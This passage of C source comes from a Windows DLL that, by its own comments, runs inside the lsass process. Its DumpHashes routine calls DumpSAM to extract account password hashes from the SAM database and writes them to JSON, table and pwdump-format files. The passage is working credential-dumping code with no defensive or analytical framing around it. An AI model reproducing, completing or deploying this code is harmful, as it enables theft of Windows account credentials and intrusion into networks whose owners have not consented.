                         logPath)) {
        return; /* cannot even build paths - nothing else to do */
    }
    _snwprintf(g_logPath, MAX_PATH, L"%s", logPath);
    g_logPath[MAX_PATH] = 0;
    Dlog("dll: DumpHashes enter (inside lsass, folder provided)");

    hHashFile = GM_CreateSecureFile(dmpPath);
    if (hHashFile == INVALID_HANDLE_VALUE) {
        _snprintf(resultLine, sizeof(resultLine) - 1,
                  "FAIL cannot create %ls err=%lu", GM_DMP_NAME,
                  (unsigned long)GetLastError());
        resultLine[sizeof(resultLine) - 1] = 0;
        Dlog("dll: %s", resultLine);
        GM_WriteAnsiSecure(resPath, resultLine);
        return;
    }
    hStatusFile = GM_CreateSecureFile(stPath);
    if (hStatusFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hHashFile);
        _snprintf(resultLine, sizeof(resultLine) - 1,
                  "FAIL cannot create %ls err=%lu", GM_STATUS_NAME,
                  (unsigned long)GetLastError());
        resultLine[sizeof(resultLine) - 1] = 0;
        Dlog("dll: %s", resultLine);
        GM_WriteAnsiSecure(resPath, resultLine);
        return;
    }
    Dlog("dll: output files created");

    ok = DumpSAM(hHashFile, hStatusFile, wsvDomain, err, sizeof(err));
    CloseHandle(hHashFile);
    CloseHandle(hStatusFile);
    Dlog("dll: DumpSAM returned %d %s%s", ok ? 1 : 0, ok ? "" : "err=",
         ok ? "" : err);

    if (!ok) {
        _snprintf(resultLine, sizeof(resultLine) - 1, "FAIL DumpSAM %s", err);
        resultLine[sizeof(resultLine) - 1] = 0;
        GM_WriteAnsiSecure(resPath, resultLine);
        return;
    }

    /* ---- friendly outputs ---- */
    domainU8 = gm_utf16_to_utf8(g_domain16);
    json = gm_build_json(domainU8, (const GM_USER *const *)g_users,
                          g_user_count, 1);
    pwdump = gm_build_pwdump((const GM_USER *const *)g_users, g_user_count);
    table = gm_build_table(domainU8, (const GM_USER *const *)g_users,
                            g_user_count, 1);

    if (json && GM_WriteAnsiSecure(jsPath, json))
        Dlog("dll: WARNING failed to write %ls", GM_JSON_NAME);
    if (pwdump && GM_WriteAnsiSecure(txtPath, pwdump))
        Dlog("dll: WARNING failed to write %ls", GM_TXT_NAME);
    else
        Dlog("dll: report files written (%ls, %ls)", GM_JSON_NAME,
             GM_TXT_NAME);

    _snprintf(resultLine, sizeof(resultLine) - 1, "OK %u",
              (unsigned)g_user_count);
    resultLine[sizeof(resultLine) - 1] = 0;
    GM_WriteAnsiSecure(resPath, resultLine);
    Dlog("dll: result written: %s", resultLine);

    free(json);
    free(pwdump);
    free(table);
    free(domainU8);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    (void)hinstDLL;
    (void)fdwReason;
    (void)lpReserved;
    return TRUE;
}
